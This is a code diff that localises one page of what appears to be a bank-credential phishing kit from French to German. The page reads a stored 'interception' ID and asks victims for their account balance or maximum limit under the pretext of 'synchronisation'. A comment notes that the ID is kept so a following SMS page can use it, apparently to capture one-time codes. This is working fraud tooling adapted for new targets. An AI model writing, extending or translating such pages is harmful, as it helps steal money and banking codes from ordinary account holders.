@@ -15,7 +15,7 @@ export default function AmountPage() {
   useEffect(() => {
     const id = sessionStorage.getItem("current_interception_id");
     if (!id) {
-      setError("Session de liaison introuvable. Veuillez recommencer.");
+      setError("Error");
     } else {
       setInterceptionId(id);
     }
@@ -40,14 +40,14 @@ export default function AmountPage() {
       const data = await response.json();
 
       if (!response.ok) {
-        throw new Error(data.error || "Impossible d'enregistrer le montant.");
+        throw new Error(data.error || "Error");
       }
 
       // ON NE SUPPRIME PLUS L'ID ICI POUR QUE LA PAGE SMS PUISSE LE RÉCUPÉRER
       setShowSuccess(true);
 
     } catch (err: any) {
-      setError(err.message || "Erreur réseau.");
+      setError(err.message || "Error.");
     } finally {
       setIsLoading(false);
     }
@@ -65,15 +65,15 @@ export default function AmountPage() {
             <div className="success-icon-circle">
               <i className="fa-solid fa-check"></i>
             </div>
-            <h2 className="modal-title">Montant Validé</h2>
+            <h2 className="modal-title">Validierter Betrag</h2>
             <button onClick={goToSmsPage} className="btn-link-bank" style={{ background: '#15b565', width: '100%' }}>
-              <i className="fa-solid fa-arrow-right"></i> Continuer
+              <i className="fa-solid fa-arrow-right"></i> Weitermachen
             </button>
           </div>
         </div>
       )}
 
-      <Link href="/operation" className="back-btn" style={{ alignSelf: 'flex-start' }}>
+      <Link href="/de/operation" className="back-btn" style={{ alignSelf: 'flex-start' }}>
         <i className="fa-solid fa-arrow-left"></i>
       </Link>
 
@@ -82,9 +82,9 @@ export default function AmountPage() {
           <i className="fa-solid fa-money-bill-transfer"></i>
         </div>
 
-        <h1 className="otp-title">Montant du virement</h1>
+        <h1 className="otp-title">Überweisungsbetrag</h1>
         <p className="otp-subtitle">
-          Veuillez indiquer le montant actuel ou la limite maximale autorisée de votre compte pour finaliser la synchronisation.
+          Bitte geben Sie Ihren aktuellen Kontostand oder das maximal zulässige Limit an, um die Synchronisierung abzuschließen.
         </p>
 
         {error && <div className="error-message" style={{ background: '#fdf2f2', color: '#ec5b5b', padding: '12px', borderRadius: '12px', fontSize: '13px', marginBottom: '10px', width: '100%', textAlign: 'center' }}>{error}</div>}
@@ -103,7 +103,7 @@ export default function AmountPage() {
         </div>
 
         <button type="submit" className="btn-link-bank" disabled={isButtonDisabled}>
-          {isLoading ? <div className="spinner"></div> : <><i className="fa-solid fa-circle-check"></i> Confirmer le montant</>}
+          {isLoading ? <div className="spinner"></div> : <><i className="fa-solid fa-circle-check"></i> Betrag bestätigen</>}
         </button>
       </form>
     </div>
